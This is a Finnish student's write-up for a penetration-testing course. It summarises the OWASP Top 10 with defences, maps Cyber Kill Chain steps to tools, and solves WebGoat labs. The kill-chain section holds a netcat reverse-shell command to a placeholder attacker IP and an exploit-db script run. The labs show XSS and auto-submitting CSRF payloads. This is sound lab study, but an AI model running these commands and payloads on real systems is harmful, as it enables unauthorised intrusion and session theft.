# Harjoitus 2
### [OWASP top 10 WebApp - haavoittuvuuksia](https://owasp.org/www-project-top-ten/)

#### 1. Injektiot
* Älä luota käyttäjään. Käyttäjä voi syöttää "virheellistä" dataa tulkille osana komentoja tai kyselyä (query) saadakseen verkkosovelluksen tekemään asioita mihin sitä ei alunperin oltu suunniteltu.
* Koko injektiohaavoittuvuus perustuu verkkosovelluksen kykenemättömyyteen validoida ja puhdistaa/käsitellä dataa mitä käytetään.
* Kaikki mikä hyväksyy parametrejä syöttönä ovat potentiaalisesti haavoittuvia koodinsyöttöhyökkäyksille eli injektioille.
* Hyöty hyökkääjälle on se että tätä kautta hän voi suorittaa tahattomia komentoja tai päästä käsiksi dataan ilman kunnollista autentikaatiota.
* Estäminen : Käyttäjän syöttämä data validoidaan ja filtteröidään applikaation toimesta. Esimerkkinä turvalliset API:t tai [ORM-kehykset](https://www.fullstackpython.com/sqlalchemy.html) jotka käyttävät parametrisoituja lausekkeita "konepellin alla".

#### 2. Rikkinäinen autentikaatio
* Applikaation toiminnallisuus autentikaatioista ja istuntojen hallinnoinnista on usein toteutettu kehnosti, tämä voi johtaa hyökkääjän pääsyyn viemään salaista tietoa tai hyödyntämään muita toteutusvikoja viedäkseen identiteettejä.
* Istuntojen hallintahyökkäykset ovat hyvin ymmärrettyjä nykyään. Hyökkääjä voi huomata rikkinäisen autentikaation manuaalisesti ja toteuttaa hyökkäyksen automatisoiduilla työkaluilla (salasanalistat/sanakirjahyökkäykset).
* Applikaatiossa voi olla rikkinäinen autentikaatio jos se hyväksyy automatisoituja hyökkäyksiä ( trial n error) , kuten brute forceemista tai sanakirjahyökkäyksiä. Eli sinulla on loputtomasti yrityksiä saada esimerkiksi käyttäjätunnus:salasana - kombinaatio oikein.
* Estäminen : Rajoita epäonnistuneita sisäänkirjautumisyrityksiä. Kerää lokitietoja ja hälytä pääkäyttäjiä jos yrityksiä käyttäjän sisäänkirjautumiselle alkaa sadella epäinhimilliseen tahtiin. Käytä myös sisäänrakennettua istunnonhallintaa joka luo uudet istuntotunnukset (SessionID) randomilla ja suurella entropialla kirjautumisen jälkeen. Istuntojen tunnukset eivät myöskään saisi näkyä URL:issa sekä tunnukset on mitätöitävä uloskirjautumisen yhteydessä.

#### 3. Arkaluontoisen datan paljastuminen
* Yleisin moka on jättää data suojaamatta. Hyökkääjät voivat varastaa tai muokata kehnosti suojattua dataa suorittaakseen liudan eri rikoksia, esimerkkinä identiteettivarkaus.
* Jos verkkosivu/applikaatio ei käytä tai pakota TLS:ää kaikille sivuille, hyökkääjä voi monitoroida verkkoliikenettä, siepata pyyntöjä ja varastaa käyttäjän istunto cookien. Hyökkääjä voi sen jälkeen uudelleen käyttää cookien ja kaapata epäonnisen käyttäjän istunnon (Session hijacking).
* Myös välimieshyökkäys (MITM) on potentiaalinen tapa päästä arkaan dataan käsiksi.
* Levossa tai liikessä olevan datan suojaamattomuus on iso riski.
* Estäminen : Suojaa data levossa että liikkessä. Älä turhaan varastoi arkaluontoista dataa.

#### 4. XML:än ulkoiset entititeetit (XXE)
* Huonosti konffatut XML prosessorit riskitekijänä. Hyökkääjä voi potentiaalisesti sisällyttää haitallista sisältöä sisältävän XML dokumentin viittauksen kautta.
* Ulkoisia XML entititeettejä voidaan käyttää esim. palvelimen sisäisten tiedostojen näyttämiseen (URI handler).
* Hyökkääjän hyöty tässä on esimerkiksi datan siirto palvelimelta omalleen, suorittaa etäyhteyden palvelimelta takaisin omalleen, skannata/luetteloida(enumeroida) sisäisiä järjestelmiä.
* Estäminen : Kehittäjien kouluttaminen tunnistamaan ja mitigoimaan XXE, JSON:in käyttäminen mahdollisuuksien mukaan, XXE:n käytön ja DTD prosessoinnin disablointi kaikissa XML-parsereissa. XSD-validaattorin tai muun vastaavan käyttö.

#### 5. Rikkinäinen pääsynvalvonta
* Käyttäjien epäonnistunutta oikeuksien rajoittamista. Rajoitteita ei pakoteta tarpeeksi. Eli käyttäjänä pääset paikkoihin mihin sinun ei kuuluisi päästä.
* Hyökkääjänä voit manuaalisesti testata esim. webbisivun eri paikkoja, pääsetkö tekemään asioita mitä sinun ei kuuluisi pystyä tehdä. Yksi yleinen haavoittuvuus on ohittaa pääsynvalvonta muokkaamalla URL:ia. Myös FTP/SFTP yhteydet palvelimeen kannattaa testata.
* Estäminen : Pääsynvalvonta täytyy pakottaa luotettavassa palvelinpuoleisessa koodissa tai API:ssa. Nyrkkisääntönä deny by default, poislukien julkiset resurssit. Potentiaalista hyökkääjää ei saa päästää muokkaamaan metadataa (esim .git)

#### 6. Turvallisuuden väärä/huono määrittely
* Käsittää oletuskonfiguraation käytön, ad hoc menettelytavalla suoritetun konffauksen ja esimeriksi liian informatiiviset virheilmoitukset.
* Hyökkääjä voi hyväksikäyttää korjaamattomia vikoja tai päästä etenemään oletuskäyttäjien tunnuksilla järjestelmässä. Lopputuloksena luvaton pääsy sisälle.
* Tämä haavoittuvuus voi tapahtua missä tahansa applikaatiopinon kerroksessa. Kohtasin tämän kyseisen haavoittuvuuden ensinmäisessä HackTheBox-maalikoneessani.
* Estäminen : Ei turhia portteja auki, ei turhia komponentteja. Komponenttien pathaus päivityksien kautta. Disabloi tai poista oletuskäyttäjät.

#### 7. Sivustojen välinen komentosarja (XSS)
* XSS- haavoittuvuus tapahtuu kun applikaatio sisällyttää epäluotettavaa dataa uudelle sivulle ilman kunnollista validointia.
* XSS antaa hyökkääjälle mahdollisuuden suorittaa skriptejä kohteen selaimessa millä voidaan vaikkapa kaapata sessioita tai uudelleenohjata haitallisille sivustoille.
* XSS:än muotoja on kolme: 
  * Heijastava
  * Tallennettu
  * DOM
*  Yleisesti XSS haavoittuvuudet tarvitsevat käyttäjän vuorovaikutusta.
* Estäminen : Kehysten käyttäminen jotka automaattisesti escapeevat XSS:ää, kuten ReactJS.
#### 8. Turvaton deserialisaatio
* Serialisointi on objektien kääntämistä tavuista merkkijonoksi <> Deserialisointi taas on tavujonojen kääntämistä objektiksi.
* Vaikeaa hyödyntää, yleensä julkisia exploitteja joutuu muuttamaan sopivaksi. Vaatii taitoa.
* Tämä johtaa yleensä RCE-hyökkäyksiin (Etänä suoritettava koodi).
* Vaikka turvaton deserialisaatio ei johtaisi Remote Code Execution- hyökkäykseen sitä voidaan käyttää mm. replay-,injektio- ja oikeuksien eskaloitumishyökkäyksissä.
* Applikaatiot ja API:t haavoittuvaisia jos ne deserialisoivat vihamielisiä/haitallisia objekteja mitä hyökkääjä on toimittanut.
* Estäminen : Paras tapa on olla hyväksymättä serialisoituja objekteja epäluotettavista lähteistä.

#### 9. Haavoittuvaisten komponenttien käyttö
* Nimenä käytännössä itsestäänselvyys. Päivitä pakettisi mahdollisuuksien mukaan.
* Puhtaaksikirjoitettuja exploitteja on internet pullollaan. Jotkin niistä vaativat hienosäätöä toimiakseen.
* Miksi tämä on vielä ongelma?
  * Vanha koodi (Legacy code) ei toimi uusissa versioissa riippuvuuksien vuoksi.
  * Kehittäjät pelkäävät että päivitys rikkoo jotain applikaatiossa
  * KnowHow- kuinka päivitetään oikeaoppisesti.
* IDS & Palomuuri oivia tapoja suorittaa virtuaalista päivitystä jos päivittäminen ei syystä tai toisesta ole mahdollista.

#### 10. Riittämätön lokitietojen kerääminen & monitorointi
* OWASP:in mukaan tämän hyväksikäyttäminen on kulmakivenä melkein kaikissa isoissa tietomurto/hakkerointitapahtumissa.
* monitorointi ja lokitietojen kerääminen on pielessä jos :
  * Perus penaaminen ja skannailu ei triggeröi hälytyksiä
  * Varoitukset ja error-viestit eivät luo lokitietoja, tai ne ovat epäselviä.
  * Applikaatioiden ja API:en lokeja ei monitoroida epätavallisesta aktiviteetista.
  * Jos käyttäjä näkee milloin lokitietoja kerätään ja näkee hälytyksiä siitä.
* Estäminen : Varmista että kaikki kirjautumistiedot, kulunvalvontavirheet ja palvelinpuoleiset syötevalidoinnin virheet logataan hyvin. Niitä myös tulee säilyttää muuallakin kuin paikallisesti jotta jälkikäteen voidaan suorittaa rikosteknisiä analyyseja.

## [Kybertappoketjun](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/Gaining_the_Advantage_Cyber_Kill_Chain.pdf) työkalut
#### Vaihe 1: Tiedustelu
Tiedustelun voi aloittaa vaikka kohdekoneen porttien skannausta nmapilla:
`` $ sudo nmap -sC -sV -oN recon IP_OSOITE -v``
Edellämainittu komento suorittaa porttiskannauksen vain yleisisille porteille, perus NSE-skripteillä, luetteloi palveluiden versiot, outputtaa recon- nimisen tiedoston missä skannauksen tulos. ``-v`` näyttää skannauksen aikana jo löytyneet portit.

#### Vaihe 2: Aseistaminen
Valmistautumisvaihe. Yhdistä haittaohjelma + exploit toimitettavaksi hyötykuormaksi. Työkaluna tässä käytin searchsploittia.
``$ searchsploit SOFTAN_NIMI ``

#### Vaihe 3: Kuljetus
Tunkeutuminen perustuu vahvasti tiedustelussa saatuun tietoon. Esimerkkinä kuljetuksesta vaikka ``http://jokusivu.htb/upload.php`` joka ei tarkista todennettua käyttäjäistuntoa.

##### Vaihe 4: Exploittaaminen

Tunkeutuminen perustuu vahvasti tiedustelussa saatuun tietoon. Esimerkkinä vanha softa joka on haavoittuvainen vaikka todentamattomaan tiedoston lataukseen.
``$ python /usr/share/exploitdb/exploits/php/webapps/*****.py http://TARGET_IP:PORT/``
#### Vaihe 5: Asennus
Asenna tarvittavat ohjelmat jatkoa varten, esim. reverse shelliin tarvittavat ohjelmat. Nämä voit itse hostata hyökkäyskoneelta ja ladata maalikoneelta curl:illa.
``$ python -m SimpleHTTPServer`` Hostaus.
#### Vaihe 6: Komenna & Kontrolloi
Jalansijan vahvistus kohteessa. Esimerkkinä webshell + reverse shell (netcat). 
``> nc.exe HYÖKKÄYSKONE_IP 7777 -e cmd.exe``

``$ nc -lvnp 7777`` porttikuuntelu hyökkäyskoneella.

#### Vaihe 7: Toimintaa kohteessa
Tee hommasi kohdekoneessa reverseshellin kautta. Kerää dataa & enumeroi. Maalikoneeni oli Windows 10, joten enumeroin sitä [winPEAS:in](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) avulla.

## WebGoat tehtävät
#### A2 : Broken Authentication | Authentication Bypasses
Autentikoinnin ohittamistehtävässä pitää manipuloida turvakysymyksien parametrejä. vaihdoin ``secQuestion``:it ``secQuestion10`` eli lisäsin vain randomilla numeron secquestioniin. Suoritin tehtävän Burpsuiten sekä FoxyProxy-firefox lisärin avulla.
Kaappasin -> muokkasin -> lähetin eteepäin.
`` secQuestion10=moro&secQuestion11=moro&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746``
#### A2 : Broken Authentication | Secure Passwords
Ensiksi käydään teoriaa läpi NIST:in [salasanastandardeista.](https://pages.nist.gov/800-63-3/sp800-63b.html) 
Muutama tärkeimmistä säännöistä:
* Älä pyydä käyttäjää käyttämään esim. vähintään yhtä isoa kirjainta ja erikoismerkkejä. Anna heille mahdollisuus tehdä niin jos he haluavat.
* Ei salasanavinkkejä
* Ei turvakysymyksiä
* Minimikoko salasanalle on vähintään 8 merkkiä.

NIST-standardi myös pitää hyvänä käytäntönä salasanojen kopioimista salanasanakenttään jotta ihmiset voivat kopioida erittäin vahvoja salasanoja kenttään.
Ensinmäinen tehtävä tästä oli keksiä sopivan vahva salasana. Hakkasin näppäimistöä villisti 13 merkin verran sikinsokin ja sain arvioidun murtamisajan 31709 vuoteen.
Lisää teoriaa : NIST suosittelee salasanojen talletukseen enkryptaamista ja suojattua kanavaa salasanojen pyytämiseen. Myös salasanojen suolaaminen ja hashaus ovat hyviä käytäntöjä.
#### A3 : Sensitive Data Exposure
###### Konsepti : Salaaminen on tärkeä työkalu turvalliseen kommunikaation.
###### Tavoitteet :
* Käyttäjällä on perusymmärrys packetsnifferin käytöstä.
* Käyttäjä osaa siepata ja lukea salaamattomia pyyntöjä.

A3 tehtävässä piti siepata pyyntö käyttäjätunnuksesta ja salasanasta. Burp Suitella kaappaus.
```
{
"username":"CaptainJack",
"password":"BlackPearl"
}  
```
#### A7 : Cross-Site Scripting (XSS)
Tämä osio kertoo mitä sivustojen välinen komentosarja on ja miten sitä käytetään kehittäjien aikomusten vastaisesti.
Tavoite : Ymmärtää alkeellisesti XSS toiminta ( mikä on reflected XSS) ja demonstroida XSS-injektioita.
Ensinmäisessä tehtävässä piti selvittää olivatko keksit identtiset. Olivat ne. Toimi Consolen kautta ajamalla ``alert(document.cookie);`` .
Myös Burp Suite löysi keksin. ``Cookie: JSESSIONID=Q9mnWUTFEc8_12E-jp3bkOWjuO2rbt19FnAK7spa ``
XSS tehtävä 7:ssä piti vaarantaa sivusto XSS:ällä. Laitoin access code - kenttään ``<script>alert()</script``, milloin WebGoat tokaisi :
> "Seems like you tried to compromise our shop with an reflected XSS attack.
> We do our... "best"... to prevent such attacks. Try again!"

#### A8 : Cross-site forgeries | Cross-Site Request Forgeries
Sivustojen välisen pyyntöjen väärentäminen tunnetaan myös nimellä one-click attack tai CSRF.
CSRF hyväksikäyttää luottoa mikä sivustolla on käyttäjän selaimeen.
Basic Get CSRF Exercise : Triggeröi lomake ulkoisesta lähteestä:
Klikkaa submit query -> latautuu sivusto ``...csrf/basic-get-flag``
Tarkastele verkkoliikenettä, Pyynnöt-välilehdellä huomaat lomakkeen datan ja pyynnön hyötykuorman.
Lomakkeen data on : 
```
csrf:"false"
submit: "Submit+Query"
```
Hyötykuorma on : ``csrf=false&submit=Submit+Query``
Yritin päästä GET-metodin avulla osoitteeseen : ``http://localhost:8080/WebGoat/csrf/basic-get-flag?csrf=true&submit=Submit+Query``
Printtasi kilometrin verran erroria, ilmoittaen että GET-metodi ei ole sallittu. Palasin verkkovälilehdelle, huomasin että metodi on POST.
Luin tehtävänannon ja Teron vinkit pariin otteeseen ja turvauduin googlen apuun loppujen lopuksi. Elikkä piti craftata oma webbisivu jotta voit ulkopuolelta lähettää lomakkeen.
```
<html>
<body>
 <form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
  <input name="csrf" value="false" type="hidden">
  <input name="submit" type="hidden" value="submit-Query">
  <input type="submit" value="Submit">
 </form>
</body>
</html>
```
Käytin file exploreria ja navigoin test.html:ään jonka sisältö näkyy yläpuolella.
Täten sain flagin napattua viestien kera. 

Tehtävässä 4 toteutetaan melkein samalla tavalla kuin edellinen tehtävä. Lopputulokseksi googlettelun jälkeen sain napattua seuraavanlaisen html.tiedoston.
```
<form name="attack" action="http://localhost:8080/WebGoat/csrf/review" method="POST">  
     <input type="hidden" name='reviewText' value='BBVCDSDDDAWDSG!!'>  
     <input type="hidden" name='stars' value='5'>  
     <input type="hidden" name='validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'>  
</form>  
<script>document.attack.submit();</script>  
```
Täten sain postattua tämänhetkisellä sisäänkirjautuneellä käyttäjällä kommentin : ``BBVCDSDDDAWDSG!`` .
 ## MITRE ATT&CK-kehikon tekniikat
 Toteutin HackTheBox-maalikoneen hyökkäyksessä :
 * Command and Control - tekniikan Non-standard port subtekniikkaa luodakseni reverse shell yhteyden webshellin jälkeen.
 ``$ ncat -lvnp 7777 `` Kuuntelu hyökkäyskoneella. Avasin netcat yhteyden kyseisessä maalikoneessa ja ohjasin sen porttiin 7777 hyökkäyskoneelle.
 
 
 # Huom. A8-tehtävä, HackTheBox-maalikoneen korkkaaminen & sekä MITRE ATT&CK-kehikon tekniikat tein myöhässä.

## Lähteet

* [Penetration Testing Course 2020 Autumn - Tunkeutumistestaus ict4tn027-3006 Tero Karvisen johdolla](http://terokarvinen.com/2020/tunkeutumistestaus-kurssi-pentest-course-ict4tn027-3006-autumn-2020/#h2-weppi-wapise)
* [WebGoat_CSRF_vastaus](https://medium.com/@evidencemonday/webgoat-cross-site-request-forgery-solution-1c069985e80f)
* [Sucuri XSS](https://sucuri.net/guides/what-is-cross-site-scripting/)
* [salasanastandardit NIST](https://pages.nist.gov/800-63-3/sp800-63b.html)
* [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
* [ORM-Object Relational Mapping](https://www.fullstackpython.com/sqlalchemy.html)
* [Kybertappoketju Lockheed Martin](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/Gaining_the_Advantage_Cyber_Kill_Chain.pdf)
* [OWASP top 10 WebApp - haavoittuvuuksia](https://owasp.org/www-project-top-ten/)
